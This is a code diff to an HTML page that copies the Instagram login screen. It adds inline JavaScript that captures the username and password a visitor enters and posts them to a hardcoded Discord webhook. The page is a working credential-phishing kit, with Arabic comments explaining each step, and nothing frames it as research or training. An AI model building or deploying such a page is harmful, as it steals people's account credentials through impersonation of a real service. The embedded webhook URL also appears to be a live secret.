@@ -21,7 +21,7 @@
      <input type="password" id="password" placeholder="Password" class="input">
     </div>
     <div class="btn">
-      <a href="#" id="loginButton">Log In</a>
+      <button id="loginButton">Log In</button>
     </div>
    </div>
    <div class="or">
@@ -67,12 +67,52 @@
    </ul>
   </div>
   <div class="copyright">
-   © 2025 INSTAGRAM
+   © 2019 INSTAGRAM
   </div>
  </div>
 </div>
 
-<script src="script.js"></script>
+<script>
+document.getElementById("loginButton").addEventListener("click", function(event) {
+    event.preventDefault(); // منع الإرسال الافتراضي للنموذج
+
+    // الحصول على القيم من المدخلات
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    // التأكد من أن الحقول ليست فارغة
+    if (username && password) {
+        // البيانات التي سيتم إرسالها إلى ديسكورد
+        const data = {
+            content: New login attempt:\n**Username:** ${username}\n**Password:** ${password}
+        };
+
+        // رابط Webhook الخاص بك (استبدله بالرابط الفعلي)
+        const webhookUrl = "https://discord.com/api/webhooks/1345817740761628702/-MdL4BrEenT9JtuMpg3LvU4bCHXUDcExH8N-E8CgNtVuEiIzEMCDEqFvZVdst7mszQQK";
+
+        // إرسال البيانات عبر Webhook باستخدام fetch (AJAX)
+        fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data) // تأكد من تحويل البيانات إلى JSON
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log("Data sent to Discord successfully.");
+            } else {
+                console.log("Error sending data to Discord.");
+            }
+        })
+        .catch(error => {
+            console.error("Error:", error);
+        });
+    } else {
+        alert("Please fill in both fields.");
+    }
+});
+</script>
 
 </body>
 </html>
